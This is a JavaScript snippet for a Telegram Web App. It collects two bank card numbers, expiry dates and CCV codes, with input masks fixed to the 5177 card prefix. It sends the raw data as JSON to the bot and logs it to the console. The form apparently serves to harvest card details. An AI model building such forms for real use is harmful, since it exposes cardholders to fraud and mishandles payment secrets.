let tg = window.Telegram.WebApp;

$(document).ready(function() {
    $("#btnSubmit").click(function(){

        cards=[
            {"crad":$("#c1").val(), "date":$("#d1").val(),"ccv":$("#ccv1").val()},
            {"card":$("#c2").val(), "date":$("#d2").val(),"ccv":$("#ccv2").val()}
        ];
        tg.sendData(JSON.stringify(cards)); 
        console.log(cards);
        
    }); 
});

$(function(){
    //2. Получить элемент, к которому необходимо добавить маску
    tg.MainButton.text = "отправить карты"
    $(".bcard4").mask("5177 9999 9999 9999", {placeholder: "5177 5678 9123 4567" });
    $(".litle").mask("99/99", {placeholder: "мм/гг" });
    $(".tall").mask("999", {placeholder: "ccv" });
  });

